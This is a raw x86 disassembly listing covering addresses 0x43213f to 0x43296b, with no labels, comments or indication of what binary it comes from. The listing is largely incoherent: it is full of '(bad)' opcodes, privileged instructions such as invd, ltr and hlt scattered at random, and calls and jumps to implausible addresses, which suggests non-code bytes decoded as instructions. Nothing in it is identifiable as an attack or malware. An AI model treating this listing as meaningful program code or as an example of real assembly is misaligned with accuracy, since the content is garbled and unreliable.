  43213f:	push   ebp
  432140:	mov    ecx,DWORD PTR [ebx+0x489408]
  432146:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43214c:	push   ecx
  43214d:	jo     0x432137
  43214f:	inc    DWORD PTR [edi]
  432151:	or     BYTE PTR [eax],al
  432153:	call   0xce289d
  432158:	fmul   QWORD PTR [ebp+0x55]
  43215b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432161:	mov    bh,0x8c
  432163:	adc    al,0x9b
  432165:	dec    esp
  432166:	xor    bl,BYTE PTR [eax]
  432168:	mov    ecx,DWORD PTR [ebp+0xc]
  43216b:	mov    eax,DWORD PTR [ebp-0x4]
  43216e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432174:	push   es
  432175:	retf   
  432176:	mov    BYTE PTR [ebp-0x30],0x3b
  43217a:	inc    ebp
  43217b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432182:	retf   0x83fc
  432185:	into   
  432186:	dec    ebp
  432187:	retf   
  432188:	mov    ecx,DWORD PTR [ebp-0x74]
  43218b:	mov    eax,DWORD PTR [eax]
  43218d:	fdiv   QWORD PTR [ebx]
  43218f:	mov    bh,0x3
  432191:	push   es
  432192:	mov    esi,ecx
  432194:	sbb    cl,dl
  432196:	dec    ebp
  432197:	sar    DWORD PTR [ebx],cl
  432199:	push   ebp
  43219a:	jne    0x4321ab
  43219c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321a2:	lea    ebx,[eax]
  4321a4:	call   0xf4ccad6b
  4321a9:	sbb    dh,dl
  4321ab:	add    edx,ebx
  4321ad:	push   ebp
  4321ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321b4:	push   ecx
  4321b5:	mov    DWORD PTR [eax-0x30],edx
  4321b8:	test   DWORD PTR [edx],eax
  4321ba:	xadd   esp,esi
  4321bd:	pop    es
  4321be:	add    cl,dl
  4321c0:	mov    eax,ecx
  4321c2:	or     al,0x45
  4321c4:	(bad)  
  4321c5:	push   eax
  4321c6:	add    DWORD PTR [edx+0x0],eax
  4321c9:	add    ecx,DWORD PTR [ecx]
  4321cb:	and    dh,cl
  4321cd:	call   0xc72a9d
  4321d2:	add    DWORD PTR [ebp+0x0],edx
  4321d5:	mov    esp,DWORD PTR [ebp+0x18]
  4321d8:	add    BYTE PTR [eax+0x50],cl
  4321db:	xor    eax,DWORD PTR [eax]
  4321dd:	add    esp,DWORD PTR [esi+0x3b]
  4321e0:	inc    ebp
  4321e1:	je     0x432166
  4321e3:	push   ecx
  4321e4:	dec    BYTE PTR [ebp-0x77]
  4321e7:	add    eax,esi
  4321e9:	or     al,0x5e
  4321eb:	inc    eax
  4321ec:	add    BYTE PTR [ebx],al
  4321ee:	data16 and BYTE PTR [ebp+0x50],al
  4321f2:	sub    DWORD PTR [ecx],0xfffffff8
  4321f5:	add    BYTE PTR [ebp-0x75],ah
  4321f8:	add    BYTE PTR [eax],bl
  4321fa:	enter  0x894d,0x8b
  4321fe:	int3   
  4321ff:	loopne 0x4321c3
  432201:	rol    BYTE PTR [eax],0x33
  432204:	lea    cx,[ebp+0xa]
  432208:	data16 jb 0x432250
  43220b:	add    BYTE PTR [ebx+0x44890855],cl
  432211:	sbb    ah,al
  432213:	inc    ebp
  432214:	cmp    al,0xf
  432216:	add    BYTE PTR [edx+0x66],dl
  432219:	xor    ecx,DWORD PTR [eax]
  43221b:	sub    eax,DWORD PTR [edx]
  43221d:	mov    eax,DWORD PTR [eax]
  43221f:	or     al,0x66
  432221:	ror    edx,cl
  432223:	dec    ebp
  432224:	inc    ebp
  432225:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43222b:	cld    
  43222c:	or     BYTE PTR [edi+0x4501dd],dl
  432232:	ret    0xecce
  432235:	retf   
  432236:	(bad)  
  432237:	dec    ebp
  432238:	mov    al,0x8b
  43223a:	loopne 0x43225c
  43223c:	cmp    ecx,DWORD PTR [edx]
  43223e:	inc    ebp
  43223f:	daa    
  432240:	loopne 0x4321c9
  432242:	in     al,dx
  432243:	add    edi,eax
  432245:	add    BYTE PTR [eax+0x3f52e155],bh
  43224b:	push   ebp
  43224c:	inc    ebp
  43224d:	xor    ebx,edx
  43224f:	add    ebp,esp
  432251:	push   edx
  432252:	push   bp
  432254:	inc    ebp
  432255:	(bad)  
  432256:	in     eax,dx
  432257:	push   esp
  432258:	(bad)  
  432259:	inc    edx
  43225b:	sbb    al,0x33
  43225d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432264:	add    BYTE PTR [ebp+0x46],0x8b
  432268:	jmp    0xf98b:0x100041c8
  43226f:	xor    esi,DWORD PTR [edx+0x3]
  432272:	mov    ecx,DWORD PTR [edi]
  432274:	fmul   DWORD PTR [edx]
  432276:	add    BYTE PTR [eax],al
  432278:	lea    eax,[ebx-0x4700273c]
  43227e:	add    al,0x4f
  432280:	pop    DWORD PTR [eax]
  432282:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432288:	push   edx
  432289:	inc    WORD PTR [ebp+0x8]
  43228d:	mov    eax,0x514f4d
  432292:	(bad)
  432296:	add    al,al
  432298:	xor    DWORD PTR [ebx-0x74baf730],eax
  43229e:	test   DWORD PTR [esi+0x74],esp
  4322a1:	inc    ebp
  4322a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4322a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322ae:	or     dh,cl
  4322b0:	or     eax,0x8b8d5045
  4322b5:	inc    ebp
  4322b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4322bc:	jne    0x4322f1
  4322be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322c4:	add    DWORD PTR [ebx],eax
  4322c6:	add    bh,bh
  4322c8:	adc    DWORD PTR [eax],ecx
  4322ca:	adc    DWORD PTR [ebp+0x55],edi
  4322cd:	push   es
  4322ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322db:	inc    ebp
  4322dc:	mov    esp,edi
  4322de:	or     al,0xda
  4322e0:	push   eax
  4322e1:	(bad)  
  4322e2:	jne    0x432298
  4322e4:	call   0x3b1bd3
  4322e9:	inc    ebp
  4322ea:	sar    BYTE PTR [eax],0x84
  4322ed:	in     al,dx
  4322ee:	add    bh,al
  4322f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4322f7:	(bad)  
  4322f8:	and    al,al
  4322fa:	fs in  eax,dx
  4322fc:	inc    DWORD PTR [ebp-0x7b]
  4322ff:	jle    0x432310
  432301:	leave  
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	inc    esp
  432304:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43230b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432312:	call   DWORD PTR [edi]
  432314:	shr    ah,0x84
  432317:	xchg   DWORD PTR [eax],eax
  432319:	add    DWORD PTR [eax],eax
  43231b:	add    bh,bh
  43231d:	dec    ebp
  43231e:	and    BYTE PTR [ecx-0x38],dl
  432321:	push   eax
  432322:	dec    DWORD PTR [ebx+0xfd885]
  432328:	mov    BYTE PTR [ebp+0x508bac00],cl
  43232e:	mov    WORD PTR [ecx+0x0],ss
  432331:	lea    ecx,[ebx+0x108b20d8]
  432337:	mov    WORD PTR [edx],ds
  432339:	add    BYTE PTR [edi+0xff01ff],al
  43233f:	mov    ecx,DWORD PTR [ebp-0x28]
  432342:	push   ecx
  432343:	shl    BYTE PTR [ebp+0x3a],0x8b
  432347:	inc    ebp
  432348:	in     al,0xeb
  43234a:	jno    0x4322d7
  43234c:	push   edx
  43234d:	mov    DWORD PTR [eax-0x28],edx
  432350:	mov    eax,DWORD PTR [ebp+0x20]
  432353:	je     0x4322dc
  432355:	mov    eax,DWORD PTR [ecx]
  432357:	sbb    BYTE PTR [eax],al
  432359:	pop    DWORD PTR [eax]
  43235b:	add    esi,eax
  43235d:	add    bl,al
  43235f:	adc    DWORD PTR [edi],esi
  432361:	jmp    0x8bce73b3
  432366:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43236d:	jne    0x4322fa
  43236f:	mov    ecx,DWORD PTR [eax]
  432371:	in     al,0x75
  432373:	pop    DWORD PTR [ecx+0x5401]
  432379:	push   edx
  43237a:	inc    DWORD PTR [ebx]
  43237c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432382:	add    BYTE PTR [edi+0x9],dl
  432385:	call   DWORD PTR [esi]
  432387:	and    dl,al
  432389:	and    bh,bh
  43238b:	inc    edi
  43238d:	test   eax,edx
  43238f:	sldt   ebx
  432392:	xor    al,BYTE PTR [eax]
  432394:	pushf  
  432395:	(bad)  
  432396:	jmp    0x4323a4
  432398:	mov    eax,edi
  43239a:	or     al,0x75
  43239c:	inc    eax
  43239d:	call   0x431aa5
  4323a2:	mov    eax,eax
  4323a4:	loopne 0x43232a
  4323a6:	inc    ebp
  4323a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4323ad:	mov    eax,DWORD PTR [ebp+0x20]
  4323b0:	add    edi,ecx
  4323b2:	add    BYTE PTR [eax],ch
  4323b4:	cmp    edi,0x18
  4323b7:	test   DWORD PTR [ebp+0xf],esi
  4323ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323c1:	jne    0x4323c5
  4323c3:	call   0xffa21e88
  4323c8:	leave  
  4323c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4323cd:	add    ah,ch
  4323cf:	add    BYTE PTR [edi-0x48fef979],dh
  4323d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323dc:	inc    esp
  4323dd:	mov    ebx,DWORD PTR [eax]
  4323df:	fcom   st(2)
  4323e1:	add    BYTE PTR [edi],bl
  4323e3:	lea    ecx,[eax-0x18]
  4323e6:	(bad)  
  4323e7:	push   DWORD PTR [ecx]
  4323e9:	call   0xffb5714b
  4323ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323f2:	fstp   DWORD PTR [esi+ebx*8]
  4323f5:	push   ebp
  4323f6:	pop    ebp
  4323f7:	mov    esi,DWORD PTR [edx-0x38]
  4323fa:	add    DWORD PTR [eax],0x28
  4323fd:	mov    edi,DWORD PTR [ebx]
  4323ff:	xor    esi,DWORD PTR [edx+0x3]
  432402:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432406:	pop    ebp
  432407:	or     al,0x4
  432409:	inc    ecx
  43240a:	push   ebp
  43240b:	(bad)  
  43240c:	in     al,dx
  43240d:	or     ah,ch
  43240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432410:	xbegin 0xffc89a06
  432416:	clc    
  432417:	adc    al,0x45
  432419:	div    BYTE PTR [edx]
  43241b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432422:	test   DWORD PTR [ebx+0x666300f8],ebx
  432428:	add    BYTE PTR [ecx+0x66],dh
  43242b:	add    eax,DWORD PTR [ebp+0x52]
  43242e:	adc    eax,0xffffffa0
  432431:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432437:	test   DWORD PTR [eax],eax
  432439:	clc    
  43243a:	data16 or al,BYTE PTR [ebp+0x45]
  43243e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432445:	rol    BYTE PTR [ebp+0x45],1
  432448:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43244e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432454:	push   ebx
  432455:	add    BYTE PTR [eax+eax*1+0x51],dl
  432459:	jge    0x43248e
  43245b:	add    BYTE PTR [esi+0x4],dl
  43245e:	jne    0x4324c5
  432460:	mov    edx,0x457200
  432465:	jmp    0x432429
  432467:	xor    edi,DWORD PTR [ebx]
  432469:	pop    edi
  43246a:	cvtdq2ps xmm7,xmm0
  43246d:	ret    0x0
  432470:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432476:	xor    ecx,DWORD PTR [edi]
  432478:	add    eax,DWORD PTR [ecx+0x3b]
  43247b:	push   ebx
  43247c:	rdpmc  
  43247e:	out    0x8d,al
  432480:	add    BYTE PTR [eax],cl
  432482:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432488:	ret    0x450c
  43248b:	sbb    al,0x8b
  43248d:	cmp    eax,esi
  43248f:	or     cl,al
  432491:	or     al,0xc2
  432493:	pop    eax
  432494:	inc    ebp
  432495:	add    ecx,DWORD PTR [edi]
  432497:	add    esi,DWORD PTR [ebp+0x39]
  43249a:	invd   
  43249c:	jge    0x4324a8
  43249e:	mov    eax,0x478ac0
  4324a3:	cli    
  4324a4:	xor    esp,ecx
  4324a6:	mov    ebx,0x5b8ac0
  4324ab:	ret    0x33
  4324ae:	mov    eax,0x833b8b
  4324b3:	sub    BYTE PTR [ebx],al
  4324b5:	inc    ebp
  4324b6:	xor    ax,di
  4324b9:	pushf  
  4324ba:	inc    bh
  4324bc:	mov    esp,esp
  4324be:	hlt    
  4324bf:	test   DWORD PTR [ebp-0x8],esi
  4324c2:	mov    eax,DWORD PTR [ebp-0x14]
  4324c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324cb:	dec    edi
  4324cc:	or     BYTE PTR [eax],al
  4324ce:	jne    0x432459
  4324d0:	mov    esi,esp
  4324d2:	call   0x77a9b097
  4324d7:	inc    ebp
  4324d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324e4:	add    BYTE PTR [esi+0x7d],ah
  4324e7:	inc    ebp
  4324e8:	mov    bx,WORD PTR [ebp+0x8]
  4324ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4324f3:	inc    ebp
  4324f4:	mov    bx,di
  4324f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4324fe:	jge    0x4324c1
  432500:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432506:	cli    
  432507:	xor    bl,bh
  432509:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43250f:	test   BYTE PTR [eax],cl
  432511:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432518:	cmp    ebp,eax
  43251a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432521:	test   BYTE PTR [ebp+0x1],bh
  432524:	mov    ebx,0x458a00
  432529:	xor    esi,DWORD PTR [ebx]
  43252b:	add    esp,DWORD PTR [esi-0x77]
  43252e:	pop    ebp
  43252f:	loopne 0x432597
  432531:	inc    ebp
  432532:	clc    
  432533:	xor    edi,DWORD PTR [ebx]
  432535:	add    esi,DWORD PTR [edx-0x77]
  432538:	data16 fdivr QWORD PTR [ebp-0x49]
  43253c:	mov    ebx,0xb78afc
  432541:	hlt    
  432542:	xor    edi,DWORD PTR [esi+eiz*2]
  432545:	add    BYTE PTR [ebp+0x66],bl
  432548:	data16 lock clc 
  43254b:	cmp    al,0x3b
  43254d:	add    BYTE PTR [edi+0x66],dh
  432550:	psubq  mm7,QWORD PTR [ebp+0x2]
  432554:	ltr    WORD PTR [ebp+0x66]
  432558:	add    esi,eax
  43255a:	add    di,WORD PTR [ebp+0x2b]
  43255e:	data16 data16 jge 0x4325df
  432562:	mov    ebx,0xe08a8b
  432567:	jge    0x43259c
  432569:	data16 data16 xor al,0x5d
  43256d:	data16 data16 jne 0x432569
  432571:	mov    edi,DWORD PTR [ebx]
  432573:	fdiv   QWORD PTR [edx+0x7d]
  432576:	data16 data16 jge 0x4325ae
  43257a:	mov    ebx,0x758a66
  43257f:	mov    esi,0x667233
  432584:	pop    ebp
  432585:	or     BYTE PTR [esi+0x0],ah
  432588:	clc    
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	lock ja 0x432519
  43258e:	(bad)  
  432590:	jge    0x432589
  432592:	invd   
  432594:	pop    ebp
  432595:	add    BYTE PTR [ebx],al
  432597:	(bad)  
  432598:	cmp    di,WORD PTR [ebp+0xf]
  43259c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325a0:	mov    bx,WORD PTR [ebp-0x10]
  4325a4:	pop    bp
  4325a6:	fbstp  TBYTE PTR [ebx]
  4325a8:	test   DWORD PTR [ebx],eax
  4325aa:	add    BYTE PTR [ebx],bh
  4325ac:	add    BYTE PTR [esi+0x7d],ah
  4325af:	jge    0x43253c
  4325b1:	data16 in al,dx
  4325b3:	pop    ebp
  4325b4:	stc    
  4325b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325bc:	mov    edi,ebx
  4325be:	in     al,dx
  4325bf:	test   BYTE PTR [ebp+0x0],bh
  4325c2:	mov    eax,DWORD PTR [eax]
  4325c4:	call   0xbd401f54
  4325c9:	cmp    al,0x9b
  4325cb:	add    BYTE PTR [edx],dh
  4325cd:	mov    bx,di
  4325d0:	call   0x8b4ba360
  4325d5:	add    ebp,esp
  4325d7:	mov    bx,di
  4325da:	jnp    0x432602
  4325dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325e2:	mov    eax,DWORD PTR [eax]
  4325e4:	call   0x7c3eb14f
  4325e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4325fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432604:	(bad)  
  432605:	cld    
  432606:	jne    0x432644
  432608:	xor    eax,DWORD PTR [eax]
  43260a:	mov    esp,DWORD PTR [esi-0x10]
  43260d:	sti    
  43260e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432615:	data16 adc bl,bh
  432618:	push   ebp
  432619:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432620:	mov    WORD PTR [eax],es
  432622:	fwait
  432623:	data16 xor bh,bl
  432626:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43262c:	mov    esp,DWORD PTR [esi-0x14]
  43262f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432635:	or     al,0x2b
  432637:	mov    bh,0xba
  432639:	hlt    
  43263a:	mov    bh,bl
  43263c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432642:	dec    esi
  432643:	or     al,0x0
  432645:	mov    edi,DWORD PTR [ebx]
  432647:	or     BYTE PTR [ebp+0x3b],dh
  43264a:	mov    ecx,DWORD PTR [edi]
  43264c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432652:	xor    al,0xd8
  432654:	pop    bp
  432656:	lock xor esi,DWORD PTR [ebx]
  432659:	lea    esp,[esi+0x1f]
  43265c:	icebp  
  43265d:	jb     0x432663
  43265f:	add    al,al
  432661:	jge    0x43266f
  432663:	mov    eax,eax
  432665:	fsubr  st,st(3)
  432667:	pop    ebp
  432668:	mov    esi,DWORD PTR [ebx]
  43266a:	in     al,0x8d
  43266c:	rcr    DWORD PTR [edi],0xc2
  43266f:	jb     0x4326cf
  432671:	add    cl,cl
  432673:	jge    0x432681
  432675:	mov    edx,DWORD PTR [ebp-0x20]
  432678:	in     al,dx
  432679:	pop    ebp
  43267a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43267f:	cmp    di,WORD PTR [ebp+0x0]
  432683:	mov    ebp,DWORD PTR [ebx]
  432685:	fdivr  QWORD PTR [esi+0x668a5d]
  43268b:	cmp    al,0x33
  43268d:	mov    si,0x4e7d
  432691:	mov    eax,DWORD PTR [eax]
  432693:	lock inc ebp
  432695:	mov    esi,DWORD PTR [eax]
  432697:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43269e:	clc    
  43269f:	(bad)  
  4326a0:	cmp    edi,DWORD PTR [ebx]
  4326a2:	je     0x4326b3
  4326a4:	push   ebx
  4326a5:	loopne 0x4326b6
  4326a7:	dec    ecx
  4326a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4326ac:	int    0xf1
  4326ae:	mov    esi,0x703084d
  4326b3:	pcmpgtd mm6,mm1
  4326b6:	add    BYTE PTR [ebp+0x66],dh
  4326b9:	jmp    0x432686
  4326bb:	mov    eax,DWORD PTR [ebx]
  4326bd:	lock push ebp
  4326bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326c5:	or     bh,dl
  4326c7:	jb     0x4326c7
  4326c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326cf:	loopne 0x4326d1
  4326d1:	jne    0x4326d5
  4326d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4326d7:	mov    ecx,ebx
  4326d9:	data16 cmp al,0xf1
  4326dc:	add    BYTE PTR [esi+eiz*2],bh
  4326df:	add    bl,cl
  4326e1:	retw   0xf2
  4326e5:	ret    0x66
  4326e8:	retf   
  4326e9:	enterw 0x4df1,0x19
  4326ee:	pop    edi
  4326ef:	jne    0x432672
  4326f1:	mov    esi,DWORD PTR [eax]
  4326f3:	call   0x77b7b294
  4326f8:	xor    ebp,DWORD PTR [ebx]
  4326fa:	lea    esp,[esi+0x48]
  4326fd:	repnz in eax,0x3b
  432700:	add    BYTE PTR [ebp-0x37],dh
  432703:	xor    edx,DWORD PTR [ebp-0x15]
  432706:	in     al,dx
  432707:	xor    edx,DWORD PTR [esi+0x40]
  43270a:	mov    DWORD PTR [edi],0x338545fc
  432710:	clc    
  432711:	add    esi,DWORD PTR [ecx]
  432713:	pop    edi
  432714:	pushf  
  432715:	pop    ebx
  432716:	call   0xff4426dd
  43271b:	mov    edi,eax
  43271d:	push   ecx
  43271e:	pop    es
  43271f:	mov    edi,DWORD PTR [eax]
  432721:	push   esi
  432722:	inc    esi
  432723:	add    bh,BYTE PTR [esi+0x0]
  432726:	popa   
  432727:	data16 (bad) 
  432729:	into   
  43272a:	gs cmp al,0xcd
  43272d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432733:	ret    0x66
  432736:	add    bh,al
  432738:	add    bh,ah
  43273a:	add    BYTE PTR [ebp+0x31c3f866],al
  432740:	cmp    al,0x9c
  432742:	add    BYTE PTR [esi+0x66],ah
  432745:	into   
  432746:	ret    
  432747:	pop    ebp
  432748:	adc    BYTE PTR [edi+0x0],dl
  43274b:	mov    bh,0x66
  43274d:	mov    edi,0xff038dc3
  432752:	jne    0x4327a8
  432754:	lea    edx,[ecx+0x1]
  432757:	mov    ebx,0xd64ff1
  43275c:	sar    DWORD PTR [ebx],1
  43275e:	test   BYTE PTR [ebp+0x36],dh
  432761:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432765:	push   edi
  432766:	xor    BYTE PTR [ebx],0x38
  432769:	mov    esi,ebx
  43276b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432771:	ss inc ebp
  432773:	fs pop ebx
  432775:	mov    ebx,0x9c3b30
  43277a:	je     0x4327a7
  43277c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432782:	mov    WORD PTR [ebx],?
  432784:	ss mov ebx,0x8b4e64
  43278a:	pop    edi
  43278b:	cmp    ecx,ecx
  43278d:	jne    0x4327e4
  43278f:	mov    ebp,esp
  432791:	cld    
  432792:	push   esi
  432793:	pop    ebx
  432794:	inc    ebp
  432795:	stc    
  432796:	xor    BYTE PTR [ebp+0x9bef89c],al
  43279c:	test   esi,ecx
  43279e:	clc    
  43279f:	test   dl,dl
  4327a1:	cmp    bh,bh
  4327a3:	fs pop si
  4327a6:	or     bl,al
  4327a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4327ae:	retf   0x3c45
  4327b1:	xor    BYTE PTR [eax],al
  4327b3:	pushf  
  4327b4:	mov    si,0x85ca
  4327b8:	ret    0xf8
  4327bb:	pop    ebx
  4327bc:	dec    dx
  4327bf:	mov    edx,DWORD PTR [edi-0x76]
  4327c2:	push   edi
  4327c3:	add    al,0xb7
  4327c5:	xor    al,0xba
  4327c7:	cmp    al,0x8d
  4327c9:	je     0x4327ca
  4327cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327cf:	lea    edi,[ebx+0x544fff]
  4327d5:	push   ecx
  4327d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4327d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327df:	add    BYTE PTR [ebx],dh
  4327e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4327ee:	mov    ebx,0x3b3b00
  4327f3:	jne    0x432820
  4327f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4327fb:	xor    esi,DWORD PTR [ebx]
  4327fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432803:	push   edi
  432804:	cmp    esp,ebp
  432806:	jne    0x432808
  432808:	sbb    DWORD PTR [eax],0x8085c3fc
  43280e:	clc    
  43280f:	inc    esi
  432810:	pop    ebx
  432811:	sti    
  432812:	add    eax,0xeb8bc075
  432817:	cld    
  432818:	xor    edi,DWORD PTR ds:0xf8c3855e
  43281e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432821:	rol    DWORD PTR [ebp-0x37],0xf
  432825:	mov    DWORD PTR [eax],ecx
  432827:	inc    edi
  432828:	(bad)  
  432829:	in     eax,0xfe
  43282b:	add    bh,bh
  43282d:	(bad)  
  43282e:	mov    esi,0xc38a5e
  432833:	mov    esi,DWORD PTR [ebx]
  432835:	push   ecx
  432836:	mov    edi,0xfc4ec7
  43283b:	test   DWORD PTR [ebp-0x8],edx
  43283e:	xor    di,ax
  432841:	pushf  
  432842:	sub    ebp,eax
  432844:	inc    ebp
  432845:	(bad)  
  432846:	sub    edi,edi
  432848:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43284e:	inc    ebp
  43284f:	add    BYTE PTR [esi+0x2b],ah
  432852:	or     bh,BYTE PTR [edx+0xf8ac2]
  432858:	cmp    al,0x33
  43285a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432860:	(bad)  
  432861:	cmp    esi,DWORD PTR [ebx]
  432863:	je     0x43281d
  432865:	push   ebx
  432866:	dec    esi
  432867:	str    ecx
  43286a:	cmp    esp,DWORD PTR [ebp+0x75]
  43286d:	int    0x33
  43286f:	mov    edi,0x789085f
  432874:	mov    edx,DWORD PTR [eax]
  432876:	cld    
  432877:	add    cl,cl
  432879:	data16 add al,0xcb
  43287c:	push   ebp
  43287d:	add    ebp,esp
  43287f:	jne    0x43286d
  432881:	(bad)  
  432882:	mov    DWORD PTR [ecx],0xd685f7ec
  432888:	clc    
  432889:	xlat   BYTE PTR ds:[ebx]
  43288a:	inc    ebp
  43288b:	mov    esi,DWORD PTR [edx]
  43288d:	push   eax
  43288e:	pushf  
  43288f:	in     eax,0x8b
  432891:	add    ah,ch
  432893:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432897:	add    ax,0x72cb
  43289b:	cmp    al,0x0
  43289d:	add    BYTE PTR [ebp+0x66],al
  4328a0:	(bad)  
  4328a1:	retf   
  4328a2:	lock ret 0x85
  4328a6:	clc    
  4328a7:	inc    bp
  4328a9:	retf   
  4328aa:	cmp    eax,0xc77d9cc8
  4328af:	xor    ah,bh
  4328b1:	pushf  
  4328b2:	test   DWORD PTR [edi-0x8],ebx
  4328b5:	je     0x4328fc
  4328b7:	xor    esi,DWORD PTR ds:0x7020840
  4328bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4328c1:	push   ebp
  4328c2:	add    esp,ebp
  4328c4:	jb     0x432851
  4328c6:	add    BYTE PTR [eax],cl
  4328c8:	dec    ebp
  4328c9:	mov    bh,0x81
  4328cb:	push   esi
  4328cc:	push   esp
  4328cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328d4:	xor    al,BYTE PTR [eax]
  4328d6:	mov    edx,DWORD PTR [edi+0x10]
  4328d9:	(bad)  
  4328da:	scas   eax,DWORD PTR es:[edi]
  4328db:	ret    0x3b
  4328de:	jns    0x3b4425d1
  4328e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328e8:	dec    ebp
  4328e9:	or     BYTE PTR [ebx],ch
  4328eb:	ret    0x458b
  4328ee:	lock jmp 0x4328e2
  4328f1:	mov    ecx,DWORD PTR [eax]
  4328f3:	or     BYTE PTR [edi],al
  4328f5:	mov    ecx,eax
  4328f7:	xor    DWORD PTR [edx+0x2],0x0
  4328fb:	mov    bh,0xc1
  4328fd:	adc    BYTE PTR [eax],dh
  4328ff:	iret   
  432900:	inc    ebp
  432901:	mov    DWORD PTR [ebx],0x4dfff8c4
  432907:	inc    BYTE PTR [ebx]
  432909:	ret    0xf8
  43290c:	adc    DWORD PTR [esi+0x10],esp
  43290f:	clc    
  432910:	dec    ecx
  432911:	fisttp WORD PTR [ecx+0x456604c0]
  432917:	add    dh,BYTE PTR ds:0x75e0845
  43291d:	ret    0x4d
  432920:	lea    ecx,[ebx+0x18728301]
  432926:	add    BYTE PTR [ebp+0x45],al
  432929:	xor    ecx,ebp
  43292b:	pushf  
  43292c:	add    bh,al
  43292e:	add    al,ch
  432930:	inc    ebp
  432931:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432937:	xor    eax,0x781084d
  43293c:	push   esp
  43293d:	fwait
  43293e:	push   ecx
  43293f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432945:	inc    ebp
  432946:	cmp    edi,DWORD PTR [ecx]
  432948:	jbe    0x4328e6
  43294a:	mov    eax,edi
  43294c:	or     ah,dh
  43294e:	inc    ebp
  43294f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432955:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43295b:	in     al,dx
  43295c:	hlt    
  43295d:	push   esp
  43295e:	push   esp
  43295f:	push   ecx
  432960:	push   ecx
  432961:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432967:	fwait
  432968:	fwait
  432969:	xor    dh,BYTE PTR [edx]
  43296b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
